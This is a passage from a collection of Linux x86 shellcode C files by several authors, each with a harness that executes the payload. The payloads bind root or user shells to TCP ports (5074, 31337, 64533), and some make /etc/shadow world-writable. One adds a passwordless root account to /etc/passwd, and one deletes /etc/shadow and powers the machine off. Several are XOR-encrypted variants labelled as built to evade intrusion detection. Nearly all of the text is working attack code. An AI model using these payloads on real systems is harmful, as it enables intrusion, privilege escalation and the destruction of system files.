	int (*f)() = (int (*)())sc;
	f();
}





////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/* 
 * s0t4ipv6@Shellcode.com.ar
 * x86 portbind a shell in port 5074
 * 92 bytes.
 *
 */

char shellcode[] =
"\x31\xc0"			// xorl		%eax,%eax
"\x50"				// pushl	%eax
"\x40"				// incl		%eax
"\x89\xc3"			// movl		%eax,%ebx
"\x50"				// pushl	%eax
"\x40"				// incl		%eax
"\x50"				// pushl	%eax
"\x89\xe1"			// movl		%esp,%ecx
"\xb0\x66"			// movb		$0x66,%al
"\xcd\x80"			// int		$0x80
"\x31\xd2"			// xorl		%edx,%edx
"\x52"				// pushl	%edx
"\x66\x68\x13\xd2"		// pushw	$0xd213
"\x43"				// incl		%ebx
"\x66\x53"			// pushw	%bx
"\x89\xe1"			// movl		%esp,%ecx
"\x6a\x10"			// pushl	$0x10
"\x51"				// pushl	%ecx
"\x50"				// pushl	%eax
"\x89\xe1"			// movl		%esp,%ecx
"\xb0\x66"			// movb		$0x66,%al
"\xcd\x80"			// int		$0x80
"\x40"				// incl		%eax
"\x89\x44\x24\x04"		// movl		%eax,0x4(%esp,1)
"\x43"				// incl		%ebx
"\x43"				// incl		%ebx
"\xb0\x66"			// movb		$0x66,%al
"\xcd\x80"			// int		$0x80
"\x83\xc4\x0c"			// addl		$0xc,%esp
"\x52"				// pushl	%edx
"\x52"				// pushl	%edx
"\x43"				// incl		%ebx
"\xb0\x66"			// movb		$0x66,%al
"\xcd\x80"			// int		$0x80
"\x93"				// xchgl	%eax,%ebx
"\x89\xd1"			// movl		%edx,%ecx
"\xb0\x3f"			// movb		$0x3f,%al
"\xcd\x80"			// int		$0x80
"\x41"				// incl		%ecx
"\x80\xf9\x03"			// cmpb		$0x3,%cl
"\x75\xf6"			// jnz		<shellcode+0x40>
"\x52"				// pushl	%edx
"\x68\x6e\x2f\x73\x68"		// pushl	$0x68732f6e
"\x68\x2f\x2f\x62\x69"		// pushl	$0x69622f2f
"\x89\xe3"			// movl		%esp,%ebx
"\x52"				// pushl	%edx
"\x53"				// pushl	%ebx
"\x89\xe1"			// movl		%esp,%ecx
"\xb0\x0b"			// movb		$0xb,%al
"\xcd\x80"			// int		$0x80
;

main() {
        int *ret;
        ret=(int *)&ret +2;
        printf("Shellcode lenght=%d\n",strlen(shellcode));
        (*ret) = (int)shellcode;
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/* !!!!!! PRIVATE !!!!!!!

   // ANTI-IDS SHELLCODE //
   // !!!!!!!!!!!!!!!!!! //

   s0t4ipv6@shellcode.com.ar
   0x1d abril 0x7d2
   ./test.c

   !!! Shellcode (execve sh) Encriptada 
   !!! AHORA EN 58 BYTES !!!!!!!!!!!!!!

   Notese que la encripcion se ha hecho a toda la shellcode y no solamente al string /bin/sh.

   Perteneciente al paquete JempiScodes.tgz, por Matias Sedalo <s0t4ipv6@shellcode.com.ar>.
   http://www.shellcode.com.ar/Projects/JempiScodes(version).tgz !!

   En caso de requerirla para otra plataforma, dentro de la linea BSD. Mailme.

*/
#include <stdio.h>

char shellcode[]= 

"\xeb\x1b\x5f\x31\xc0\x6a\x53\x6a\x18\x59\x49\x5b\x8a\x04\x0f" // 0x14 de mayo
"\xf6\xd3\x30\xd8\x88\x04\x0f\x50\x85\xc9\x75\xef\xeb\x05\xe8"
"\xe0\xff\xff\xff\x1c\x7f\xc5\xf9\xbe\xa3\xe4\xff\xb8\xff\xb2"
"\xf4\x1f\x95\x4e\xfe\x25\x97\x93\x30\xb6\x39\xb2\x2c";		// ***********

/*
"\xeb\x29\x31\xc0\x31\xdb\x8b\x24\x24\x29\xd2\x4a\x31\xc9\xb1"
"\x18\xb3\x53\x8a\x04\x0c\xf6\xd3\x30\xd8\x88\x04\x17\x86\xc3"
"\x49\x4a\x85\xc9\x75\xee\x42\x89\xec\x01\xd7\x57\xc3\xe8\xd2"
"\xff\xff\xff\x53\x1c\x7f\xc5\xf9\xbe\xa3\xe4\xff\xb8\xff\xb2"
"\xf4\x1f\x95\x4e\xfe\x25\x97\x93\x30\xb6\x39\xb2\x2c";
*/

void main() {
	int *ret;
	ret = (int *)&ret +2;
        printf("Shellcode lenght=%d\n",strlen(shellcode));
	(*ret) =(int)shellcode;
}

// ANTI-IDS SHELLCODE //
// !!!!!!!!!!!!!!!!!! //




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
 * !!!!!! ANTI IDS SHELLCODE !!!!!!
 *
 * s0t4ipv6@shellcode.com.ar
 * 0x17abril0x7d2
 *
 * !!!!! ENCRIPTADA !!!!!

 * 75 bytes
 * chmod 666 /etc/shadow

 * !!!!! ENCRIPTADA !!!!!
 *
 * Para mas informacion
 * Descargue http://www.shellcode.com.ar/Projects/JempiScodes(version).tgz
 *
 * !!!!!! ANTI IDS SHELLCODE !!!!!!
*/

#include <stdio.h>

char shellcode[]=
"\xeb\x1b\x5f\x31\xc0\x6a\x53\x6a\x29\x59\x49\x5b\x8a\x04\x0f"
"\xf6\xd3\x30\xd8\x88\x04\x0f\x50\x85\xc9\x75\xef\xeb\x05\xe8"
"\xe0\xff\xff\xff\x03\xb6\x90\x07\xbe\x39\xba\x79\x6c\x87\x20"
"\xf0\x48\xcf\x0e\x8f\x40\x3d\xb2\x4e\x0e\x7f\x72\xb2\x97\xf3"
"\xe4\xff\xff\x2f\xb5\xee\xe8\xb3\xa3\xe4\xf6\xfa\xf4\xe7\xdb";

void main() {
        int *ret;
        ret = (int *)&ret +2;
        printf("Shellcode lenght=%d\n",strlen(shellcode));
        (*ret) =(int)shellcode;
}





////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
 * s0t4ipv6@shellcode.com.ar
 * 0x04abril0x7d2
 * 
 * int sys_chmod(const char * filename, mode_t mode)
 * {...}
 * 
 * Utilizando la interrupcion 15(chmod), asignando el octal 0666
 * al archivo deseado. En este caso /etc/shadow
 * 
 * Hice unas modificaciones en el codigo y solo pude reducir la shellcode en 1.
 * por el codigo mailme.
 *	"\x31\xdb\x68\x64\x6f\x77\x53\x68\x2f\x73\x68\x61\x68\x2f\x65"
 *	"\x74\x63\x89\xe3\x31\xc9\x88\x4c\x24\x0b\x66\xb9\xb6\x01\x31"
 *	"\xc0\xb0\x0f\xcd\x80\x31\xc0\x40\xcd\x80";
 *
*/

#include <stdio.h>

// Shellcode			//	Asm Code		// Main Interval
char shellcode[]=
"\xeb\x17"			//	jmp     0x17		[3 ; 4]
"\x5e"				//	popl    %esia		[5]
"\x31\xc9"			//	xorl    %ecx, %ecx	[6 ; 7]
"\x88\x4e\x0b"			//      movb    %ecx, 0xb(%esi)	[8; 10]
"\x8d\x1e"			//	leal    (%esi), %ebx	[11;12]
"\x66\xb9\xb6\x01"		//	movw    $0x1b6, %cx     // asigno a cx el equivalente en hex al octal 0666
"\x31\xc0"			//	xorl    %eax, %eax	[17;18]
"\xb0\x0f"			//      movb    $0xf, %al       // Interrupcion 15 (chmod)
"\xcd\x80"			//      int     $0x80		[21;22]
"\x31\xc0"			//	xorl    %eax, %eax      // salida
"\x40"				//	inc     %eax		[25]
"\xcd\x80"			//      int     $0x80		[26;27]
"\xe8\xe4\xff\xff\xff"		//      call    -0x1c
"/etc/shadow";

main() {
	int *ret;
	ret=(int *)&ret+2;
	printf("Shellcode lenght=%d\n",strlen(shellcode));
	(*ret) = (int)shellcode;
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
 * !!!!!! ANTI IDS SHELLCODE !!!!!!
 *
 * s0t4ipv6@shellcode.com.ar
 * 0x14abril0x7d2
 *
 * !!!!! ENCRIPTADA !!!!!

 * 116 bytes	
 * Agrega la linea "t00r::0:0::/:/bin/sh" en /etc/passwd

 * !!!!! ENCRIPTADA !!!!!
 *
 * Para mas informacion
 * Descargue http://www.shellcode.com.ar/Projects/JempiScodes(version).tgz
 *
 * !!!!!! ANTI IDS SHELLCODE !!!!!!
*/

#include <stdio.h>

char shellcode[]=
"\xeb\x1b\x5f\x31\xc0\x6a\x28\x6a\x52\x59\x49\x5b\x8a\x04\x0f"
"\xf6\xd3\x30\xd8\x88\x04\x0f\x50\x85\xc9\x75\xef\xeb\x05\xe8"
"\xe0\xff\xff\xff\x0e\x6f\xc7\xe4\xff\xfb\xec\xf3\xf4\xb3\xa0"
"\xee\xf6\xb8\xff\xb5\xee\x02\x95\x91\x3a\xb5\x70\x32\xba\x37"
"\xb2\xf6\xb5\xbb\xb2\x04\x07\x86\x5c\x21\xb2\x2e\xc6\xf9\xbe"
"\xa3\xe4\xff\xad\xea\xb2\xf4\xfe\xa7\xf5\xff\xea\xb8\xad\xff"
"\xf5\xf5\xad\xe3\xbb\xff\xbd\x3f\x59\x66\x33\xba\x72\x97\xd3"
"\xb2\x4e\x0e\x8f\x49\x34\xb2\x3f\x72\xb2\x57";

main() {
        int *ret;
        ret=(int *)&ret+2;
        printf("Shellcode lenght=%d\n",strlen(shellcode));
        (*ret) = (int)shellcode;
}





////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
 * $Id: gets-linux.c,v 1.3 2004/06/02 12:22:30 raptor Exp $
 *
 * gets-linux.c - stdin re-open shellcode for Linux/x86
 * Copyright (c) 2003 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * Local shellcode for stdin re-open and /bin/sh exec. It closes stdin 
 * descriptor and re-opens /dev/tty, then does an execve() of /bin/sh.
 * Useful to exploit some gets() buffer overflows in an elegant way...
 */

/*
 * close(0) 
 *
 * 8049380:       31 c0                   xor    %eax,%eax
 * 8049382:       31 db                   xor    %ebx,%ebx
 * 8049384:       b0 06                   mov    $0x6,%al
 * 8049386:       cd 80                   int    $0x80
 *
 * open("/dev/tty", O_RDWR | ...)
 *
 * 8049388:       53                      push   %ebx
 * 8049389:       68 2f 74 74 79          push   $0x7974742f
 * 804938e:       68 2f 64 65 76          push   $0x7665642f
 * 8049393:       89 e3                   mov    %esp,%ebx
 * 8049395:       31 c9                   xor    %ecx,%ecx
 * 8049397:       66 b9 12 27             mov    $0x2712,%cx
 * 804939b:       b0 05                   mov    $0x5,%al
 * 804939d:       cd 80                   int    $0x80
 *
 * execve("/bin/sh", ["/bin/sh"], NULL)
 *
 * 804939f:       31 c0                   xor    %eax,%eax
 * 80493a1:       50                      push   %eax
 * 80493a2:       68 2f 2f 73 68          push   $0x68732f2f
 * 80493a7:       68 2f 62 69 6e          push   $0x6e69622f
 * 80493ac:       89 e3                   mov    %esp,%ebx
 * 80493ae:       50                      push   %eax
 * 80493af:       53                      push   %ebx
 * 80493b0:       89 e1                   mov    %esp,%ecx
 * 80493b2:       99                      cltd   
 * 80493b3:       b0 0b                   mov    $0xb,%al
 * 80493b5:       cd 80                   int    $0x80
 */

char sc[] = 
"\x31\xc0\x31\xdb\xb0\x06\xcd\x80"
"\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80"
"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";

main()
{
	int (*f)() = (int (*)())sc; f();
}





////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
 * $Id: portbind-linux.c,v 1.4 2004/06/02 12:22:30 raptor Exp $
 *
 * portbind-linux.c - setuid/portbind shellcode for Linux/x86
 * Copyright (c) 2003 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * Simple portbind shellcode that bind()'s a setuid(0) shell on
 * port 31337/tcp (based on bighawk's code).
 *
 * Tested on Linux.
 */

/*
 * setuid(0)
 *
 * 8049380:       31 c0                   xor    %eax,%eax
 * 8049382:       31 db                   xor    %ebx,%ebx
 * 8049384:       b0 17                   mov    $0x17,%al
 * 8049386:       cd 80                   int    $0x80
 *
 * socket(AF_INET, SOCK_STREAM, 0)
 *
 * 8049388:       31 db                   xor    %ebx,%ebx
 * 804938a:       f7 e3                   mul    %ebx
 * 804938c:       b0 66                   mov    $0x66,%al
 * 804938e:       53                      push   %ebx
 * 804938f:       43                      inc    %ebx
 * 8049390:       53                      push   %ebx
 * 8049391:       43                      inc    %ebx
 * 8049392:       53                      push   %ebx
 * 8049393:       89 e1                   mov    %esp,%ecx
 * 8049395:       4b                      dec    %ebx
 * 8049396:       cd 80                   int    $0x80
 *
 * bind(s, server, sizeof(server))
 *
 * 8049398:       89 c7                   mov    %eax,%edi
 * 804939a:       52                      push   %edx
 * 804939b:       66 68 7a 69             pushw  $0x697a
 * 804939f:       43                      inc    %ebx
 * 80493a0:       66 53                   push   %bx
 * 80493a2:       89 e1                   mov    %esp,%ecx
 * 80493a4:       b0 10                   mov    $0x10,%al
 * 80493a6:       50                      push   %eax
 * 80493a7:       51                      push   %ecx
 * 80493a8:       57                      push   %edi
 * 80493a9:       89 e1                   mov    %esp,%ecx
 * 80493ab:       b0 66                   mov    $0x66,%al
 * 80493ad:       cd 80                   int    $0x80
 *
 * listen(s, 1)
 *
 * 80493af:       b0 66                   mov    $0x66,%al
 * 80493b1:       b3 04                   mov    $0x4,%bl
 * 80493b3:       cd 80                   int    $0x80
 *
 * accept(s, 0, 0)
 *
 * 80493b5:       50                      push   %eax
 * 80493b6:       50                      push   %eax
 * 80493b7:       57                      push   %edi
 * 80493b8:       89 e1                   mov    %esp,%ecx
 * 80493ba:       43                      inc    %ebx
 * 80493bb:       b0 66                   mov    $0x66,%al
 * 80493bd:       cd 80                   int    $0x80
 *
 * dup2(c, 2)
 * dup2(c, 1)
 * dup2(c, 0)
 *
 * 80493bf:       89 d9                   mov    %ebx,%ecx
 * 80493c1:       89 c3                   mov    %eax,%ebx
 * 80493c3:       b0 3f                   mov    $0x3f,%al
 * 80493c5:       49                      dec    %ecx
 * 80493c6:       cd 80                   int    $0x80
 * 80493c8:       41                      inc    %ecx
 * 80493c9:       e2 f8                   loop   80493c3 <sc+0x43>
 *
 * execve("/bin/sh", ["/bin/sh"], NULL)
 *
 * 80493cb:       51                      push   %ecx
 * 80493cc:       68 6e 2f 73 68          push   $0x68732f6e
 * 80493d1:       68 2f 2f 62 69          push   $0x69622f2f
 * 80493d6:       89 e3                   mov    %esp,%ebx
 * 80493d8:       51                      push   %ecx
 * 80493d9:       53                      push   %ebx
 * 80493da:       89 e1                   mov    %esp,%ecx
 * 80493dc:       b0 0b                   mov    $0xb,%al
 * 80493de:       cd 80                   int    $0x80
 * 80493e0:       00 00                   add    %al,(%eax)
 */

char sc[] = /* 8 + 88 = 96 bytes */
"\x31\xc0\x31\xdb\xb0\x17\xcd\x80"
"\x31\xdb\xf7\xe3\xb0\x66\x53\x43\x53\x43\x53\x89\xe1\x4b\xcd\x80"
"\x89\xc7\x52\x66\x68"
"\x7a\x69" // port 31337/tcp, change if needed
"\x43\x66\x53\x89\xe1\xb0\x10\x50\x51\x57\x89\xe1\xb0\x66\xcd\x80"
"\xb0\x66\xb3\x04\xcd\x80"
"\x50\x50\x57\x89\xe1\x43\xb0\x66\xcd\x80"
"\x89\xd9\x89\xc3\xb0\x3f\x49\xcd\x80"
"\x41\xe2\xf8\x51\x68n/sh\x68//bi\x89\xe3\x51\x53\x89\xe1\xb0\x0b\xcd\x80";

main()
{
	int (*f)() = (int (*)())sc; f();
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
 * $Id: reusage-linux.c,v 1.3 2004/01/30 20:08:46 raptor Exp $
 *
 * reusage-linux.c - re-use of "/bin/sh" string in .rodata
 * Copyright (c) 2003 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * Short local shellcode for /bin/sh execve(). It re-uses the "/bin/sh"
 * string stored in the .rodata section of the vulnerable program. Change
 * the string address as needed (based on zillion's original idea).
 */

/*
 * execve("/bin/sh", ["/bin/sh"], NULL)
 *
 * 8049368:       31 c0                   xor    %eax,%eax
 * 804936a:       bb 08 84 04 08          mov    $0x8048408,%ebx # change it
 * 804936f:       53                      push   %ebx
 * 8049370:       89 e1                   mov    %esp,%ecx
 * 8049372:       31 d2                   xor    %edx,%edx
 * 8049374:       b0 0b                   mov    $0xb,%al
 * 8049376:       cd 80                   int    $0x80
 * 8049378:       00 00                   add    %al,(%eax)
 */

char sc[] = /* 16 bytes */
"\x31\xc0\xbb\x08\x84\x04\x08\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80";

main()
{
	int (*f)() = (int (*)())sc; f();
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/* 29 byte-long setuid(0) + execve("/bin/sh",...) shellcode
   by Marcin Ulikowski <elceef@itsec.pl> */
 
#include <unistd.h>
 
char shellcode[] =
"\x31\xdb"             /* xor    %ebx,%ebx       */
"\x8d\x43\x17"         /* lea    0x17(%ebx),%eax */
"\xcd\x80"             /* int    $0x80           */
"\x53"                 /* push   %ebx            */
"\x68\x6e\x2f\x73\x68" /* push   $0x68732f6e     */
"\x68\x2f\x2f\x62\x69" /* push   $0x69622f2f     */
"\x89\xe3"             /* mov    %esp,%ebx       */
"\x50"                 /* push   %eax            */
"\x53"                 /* push   %ebx            */
"\x89\xe1"             /* mov    %esp,%ecx       */
"\x99"                 /* cltd                   */
"\xb0\x0b"             /* mov    $0xb,%al        */
"\xcd\x80";            /* int    $0x80           */
 
int main(void) {
  void(*f)()=(void*)shellcode;f();
  return 0;
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

#include <stdio.h>
#include <string.h>

/*
	by Magnefikko
	24.04.2010
	magnefikko@gmail.com
	Promhyl Studies :: http://promhyl.oz.pl
	Subgroup: #PRekambr
	Name: 27 bytes setuid(0) ^ execve("/bin/sh", 0, 0) shellcode
	Platform: Linux x86
	
	setuid(0);
	execve("/bin/sh", 0, 0);	

	gcc -Wl,-z,execstack filename.c

	shellcode:

\x6a\x17\x58\x31\xdb\xcd\x80\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x99\x31\xc9\xb0\x0b\xcd\x80

*/


int main(){
	char shell[] ="\x6a\x17\x58\x31\xdb\xcd\x80\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x99\x31\xc9\xb0\x0b\xcd\x80";
	printf("by Magnefikko\nmagnefikko@gmail.com\npromhyl.oz.pl\n\nstrlen(shell)= %d\n", strlen(shell));
	(*(void (*)()) shell)();
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

#include <stdio.h>
#include <string.h>
 
/*
    by Magnefikko
    14.04.2010
    magnefikko@gmail.com
    promhyl.oz.pl
    Subgroup: #PRekambr
    Name: 34 bytes setreud(getuid(), getuid()) & execve("/bin/sh") shellcode
    Platform: Linux x86
     
    setreuid(getuid(), getuid());
    execve("/bin/sh"); 
 
    gcc -Wl,-z,execstack filename.c
 
    shellcode:
 
\x6a\x18\x58\xcd\x80\x50\x50\x5b\x59\x6a\x46\x58\xcd\x80\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x99\x31\xc9\xb0\x0b\xcd\x80
 
*/
 
 
int main(){
    char shell[] =
"\x6a\x18\x58\xcd\x80\x50\x50\x5b\x59\x6a\x46\x58\xcd\x80\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x99\x31\xc9\xb0\x0b\xcd\x80";
    printf("by Magnefikko\nmagnefikko@gmail.com\npromhyl.oz.pl\n\nstrlen(shell)
= %d\n", strlen(shell));
    (*(void (*)()) shell)();
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

#include <stdio.h>
#include <string.h>
 
/*
    by Magnefikko
    17.04.2010
    magnefikko@gmail.com
    Promhyl Studies :: http://promhyl.oz.pl
    Subgroup: #PRekambr
    Name: 14 bytes execve("a->/bin/sh") local-only shellcode
    Platform: Linux x86
     
    execve("a", 0, 0);
 
    $ ln -s /bin/sh a
    $ gcc -Wl,-z,execstack filename.c
    $ ./a.out
     
    Link is required.
 
    shellcode:
 
\x31\xc0\x50\x6a\x61\x89\xe3\x99\x50\xb0\x0b\x59\xcd\x80
 
*/
 
 
int main(){
    char shell[] = "\x31\xc0\x50\x6a\x61\x89\xe3\x99\x50\xb0\x0b\x59\xcd\x80";
    printf("by Magnefikko\nmagnefikko@gmail.com\npromhyl.oz.pl\n\nstrlen(shell)
= %d\n", strlen(shell));
    (*(void (*)()) shell)();
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

#include <stdio.h>
#include <string.h>
 
/*
by Magnefikko
14.04.2010
magnefikko@gmail.com
promhyl.oz.pl
Subgroup: #PRekambr
Name: 25 bytes execve("/bin/sh") shellcode
Platform: Linux x86
 
execve("/bin/sh", 0, 0);
gcc -Wl,-z,execstack filename.c
 
shellcode:
 
\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68
 
*/
 
 
int main(){
char shell[] =
"\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";
printf("by Magnefikko\nmagnefikko@gmail.com\npromhyl.oz.pl\n\nstrlen(shell)
= %d\n", strlen(shell));
(*(void (*)()) shell)();
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

#include <stdio.h>
#include <string.h>
 
/*
by Magnefikko
20.04.2010
magnefikko@gmail.com
promhyl.oz.pl
Subgroup: #PRekambr
Name: 29 bytes chmod("/etc/shadow", 0777) shellcode
Platform: Linux x86
 
chmod("/etc/shadow", 0777);
 
gcc -Wl,-z,execstack filename.c
 
shellcode:
 
\x31\xc0\x50\x68\x61\x64\x6f\x77\x68\x63\x2f\x73\x68\x68\x2f\x2f\x65\x74\x89\xe3\x66\x68\xff\x01\x59\xb0\x0f\xcd\x80
 
*/
 
 
int main(){
char shell[] =
"\x31\xc0\x50\x68\x61\x64\x6f\x77\x68\x63\x2f\x73\x68\x68\x2f\x2f\x65\x74\x89\xe3\x66\x68\xff\x01\x59\xb0\x0f\xcd\x80";
printf("by Magnefikko\nmagnefikko@gmail.com\npromhyl.oz.pl\n\nstrlen(shell)
= %d\n", strlen(shell));
(*(void (*)()) shell)();
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

#include <stdio.h>
#include <string.h>
 
/*
by Magnefikko
14.04.2010
magnefikko@gmail.com
promhyl.oz.pl
Subgroup: #PRekambr
Name: 36 bytes chmod("/etc/shadow", 0666) shellcode
Platform: Linux x86
 
chmod("/etc/shadow", 0666);
gcc -Wl,-z,execstack filename.c
 
shellcode:
 
\xeb\x12\x5b\x31\xc0\x31\xc9\x31\xd2\xb1\xb6\xb5\x01\xb0\x0f\x89\x53\x0b\xcd\x80\xe8\xe9\xff\xff\xff\x2f\x65\x74\x63\x2f\x73\x68\x61\x64\x6f\x77
 
*/
 
 
int main(){
char shell[] =
"\xeb\x12\x5b\x31\xc0\x31\xc9\x31\xd2\xb1\xb6\xb5\x01\xb0\x0f\x89\x53\x0b\xcd\x80\xe8\xe9\xff\xff\xff\x2f\x65\x74\x63\x2f\x73\x68\x61\x64\x6f\x77";
printf("by Magnefikko\nmagnefikko@gmail.com\npromhyl.oz.pl\n\nstrlen(shell)
= %d\n", strlen(shell));
(*(void (*)()) shell)();
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*

1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
0     _                   __           __       __                     1
1   /' \            __  /'__`\        /\ \__  /'__`\                   0
0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
1                  \ \____/ >> Exploit database separated by exploit   0
0                   \/___/          type (local, remote, DoS, etc.)    1
1                                                                      1
0  [+] Site            : Inj3ct0r.com                                  0
1  [+] Support e-mail  : submit[at]inj3ct0r.com                        1
0                                                                      0
1     ###############################################################  1
0     I'm Magnefikko member from Inj3ct0r Team & Promhyl Studies Team  1
1     ###############################################################  0
0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1


	by Magnefikko
	05.07.2010
	magnefikko@gmail.com
	Promhyl Studies :: http://promhyl.tk
	Subgroup: #PRekambr
	Name: 97 bytes bind sh@64533
	Platform: Linux x86
	
	sock = socket(PF_INET, SOCK_STREAM, 0);
	bind(sock, *[2, 64533, 0], 16);
	listen(sock, 5);
	nsock = accept(sock, 0, 0);
	dup2(nsock, 0);
	dup2(nsock, 1);
	execve("/bin/sh", 0, 0); // http://promhyl.tk/index.php?a=art&art=83

	gcc -Wl,-z,execstack filename.c

	shellcode:

\x6a\x66\x6a\x01\x5b\x58\x99\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\x6a\x66\x58\x43\x52\x66\x68\xfc
\x15\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x6a\x66\x58\x43\x43\x6a\x05\x56\xcd\x80\x6a\x66\x58
\x43\x52\x52\x56\x89\xe1\xcd\x80\x89\xc3\x6a\x3f\x58\x31\xc9\xcd\x80\x6a\x3f\x58\x41\xcd\x80\x31\xc0\x50
\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x99\x50\xb0\x0b\x59\xcd\x80

*/


int main(){
	char shell[] =
"\x6a\x66\x6a\x01\x5b\x58\x99\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\x6a\x66\x58\x43\x52\x66"
"\x68\xfc\x15\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x6a\x66\x58\x43\x43\x6a\x05\x56\xcd"
"\x80\x6a\x66\x58\x43\x52\x52\x56\x89\xe1\xcd\x80\x89\xc3\x6a\x3f\x58\x31\xc9\xcd\x80\x6a\x3f\x58"
"\x41\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x99\x50\xb0\x0b\x59\xcd\x80";
	printf("by Magnefikko\nmagnefikko@gmail.com\npromhyl.tk\n\nstrlen(shell) = %d\n", strlen(shell));
	(*(void (*)()) shell)();
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

#include <stdio.h>
#include <string.h>
 
/*
by Magnefikko
14.04.2010
magnefikko@gmail.com
Promhyl Studies :: http://promhyl.oz.pl
Subgroup: #PRekambr
Name: 55 bytes SLoc-DoS shellcode
Platform: Linux x86
 
unlink("/etc/shadow");
execve("poweroff", 0, 0);
 
gcc -Wl,-z,execstack filename.c
 
shellcode:
 
\xeb\x25\x5b\x31\xc0\x31\xc9\x31\xd2\x89\x43\x0b\xb0\x0a\xcd\x80\xeb\x08\x5b\x89\x53\x08\xb0\x0b\xcd\x80\xe8\xf3\xff\xff\xff\x70\x6f\x77\x65\x72\x6f\x66\x66\xe8\xd6\xff\xff\xff\x2f\x65\x74\x63\x2f\x73\x68\x61\x64\x6f\x77
 
*/
 
 
int main(){
char shell[] =
"\xeb\x25\x5b\x31\xc0\x31\xc9\x31\xd2\x89\x43\x0b\xb0\x0a\xcd\x80\xeb\x08\x5b\x89\x53\x08\xb0\x0b\xcd\x80\xe8\xf3\xff\xff\xff\x70\x6f\x77\x65\x72\x6f\x66\x66\xe8\xd6\xff\xff\xff\x2f\x65\x74\x63\x2f\x73\x68\x61\x64\x6f\x77";
printf("by Magnefikko\nmagnefikko@gmail.com\npromhyl.oz.pl\n\nstrlen(shell)
= %d\n", strlen(shell));
(*(void (*)()) shell)();
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

#include <stdio.h>
#include <string.h>
 
/*
by Magnefikko
14.04.2010
magnefikko@gmail.com
promhyl.oz.pl
Subgroup: #PRekambr
Name: 6 bytes DoS-Badger-Game shellcode
Platform: Linux x86
 
pause()
gcc -Wl,-z,execstack filename.c
 
shellcode:
 
\x31\xc0\xb0\x1d\xcd\x80
 
*/
 
 
int main(){
char shell[] = "\x31\xc0\xb0\x1d\xcd\x80";
printf("by Magnefikko\nmagnefikko@gmail.com\npromhyl.oz.pl\n\nstrlen(shell)
= %d\n", strlen(shell));
(*(void (*)()) shell)();
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
 * Linux/x86 (Fedora 8) setuid(0) + setgid(0) + execve("echo 0 > /proc/sys/kernel/randomize_va_space") 
 *
 * by LiquidWorm
 * 
 * 2008 (c) www.zeroscience.org
 *
 * liquidworm [at] gmail.com
 *
 * 79 bytes.
 * 
 */


char sc[] =

  "\x6a\x17"			// push	$0x17
  "\x58"			// pop 	%eax
